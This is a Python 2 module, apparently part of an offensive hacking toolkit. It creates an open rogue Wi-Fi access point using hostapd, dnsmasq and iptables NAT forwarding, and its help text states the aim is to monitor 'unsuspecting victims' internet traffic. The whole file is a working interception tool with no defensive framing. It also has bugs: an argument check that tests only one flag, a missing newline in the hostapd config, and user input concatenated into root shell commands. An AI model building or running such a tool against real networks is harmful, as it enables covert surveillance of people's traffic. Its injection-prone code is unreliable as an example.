import os

class access_point():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-i","-n","-b"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will create an open wifi network in which unsuspecting\n"
            "victims internet traffic can be monitored.\n"
            "\nUsage:\n"
            "############\n"
            "\n'access-point -i <interface> -b <interface to bridge> -n <name of network>'\n"
        )

        return hlp

    def access_point(self,var):
        if "-s" and "-i" and "-n" in var:
            try:
                os.system("sudo ifconfig " + var["-i"] + " 10.0.0.1 netmask 255.255.255.0")
                # editing config file for ap settings
                ap_confile = open("hostapd.conf", "w")
                config = (
                    "interface=" + var["-i"] + "\n"
                    "ssid="+var["-n"]+"\n"
                    "driver=nl80211\n"
                    "ignore_broadcast_ssid=0\n"
                    "channel=11"
                    "hw_mode=g\n"
                    "auth_algs=1\n"
                    "macaddr_acl=0\n"
                    "wpa_pairwise=TKIP CCMP\n"
                    "rsn_pairwise=CCMP\n"
                )
                ap_confile.write(config)
                ap_confile.close()

                dhcp_confile = open("/etc/dnsmasq.conf", "a")
                config = (
                    "interface=" + var["-i"] + "\n"
                    "dhcp-range=10.0.0.2,10.0.0.250,12h\n"

                )
                dhcp_confile.write(config)
                dhcp_confile.close()

                os.system("iptables -t nat -F")
                os.system("iptables -F")
                os.system("iptables -t nat -A POSTROUTING -o " + var["-b"] + " -j MASQUERADE")
                os.system("iptables -A FORWARD -i " + var["-i"] + " -o " + var["-b"] + " -j ACCEPT")
                os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

                try:
                    # start start AP and dhcp
                    os.system("sudo rfkill unblock all")
                    os.system("sudo service dnsmasq restart")
                    print("Starting wifi network..")
                    os.system("sudo hostapd hostapd.conf")
                    os.system("sudo service dnsmasq stop")
                    os.system("sudo service hostapd stop")
                    os.system('iptables -F')
                    os.system('iptables -X')
                    os.system('iptables -t nat -F')
                    os.system('iptables -t nat -X')

                    readFile = open("/etc/dnsmasq.conf")

                    lines = readFile.readlines()

                    readFile.close()
                    w = open("/etc/dnsmasq.conf",'w')

                    w.writelines([item for item in lines[:-2]])

                    w.close()
                except KeyboardInterrupt:
                    pass

            except Exception, e:
                error = []
                error.append("1")
                error.append("Error: Cannot create access point" + str(e))
                return error
